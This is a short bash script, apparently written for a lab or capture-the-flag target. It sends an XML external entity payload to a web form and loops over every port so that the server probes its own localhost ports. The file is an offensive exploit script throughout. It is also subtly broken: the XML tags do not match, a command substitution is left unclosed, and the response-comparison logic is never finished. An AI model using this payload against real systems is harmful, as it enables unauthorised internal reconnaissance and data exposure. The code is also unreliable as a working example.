#!/usr/bin/env bash

ip='10.10.10.10'
page='submit_form'

baseline=''
for i in {1..65535}; do
    response=$(curl -sL -H "Content-Type: text/xml" -d '<!DOCTYPE foo [ 
    <!ELEMENT foo ANY > 
    <!ENTITY xxe SYSTEM "http://localhost:'$i'/" >]>
    <conact>
        <name>&xxe;</name>
        <email>test@test.com</email>
        <message>test</message>
    </contact>' "http://$ip/$page"

    echo "Trying port $i ..."

    # Find something to differentiate responses
    response_length=${#response}
done
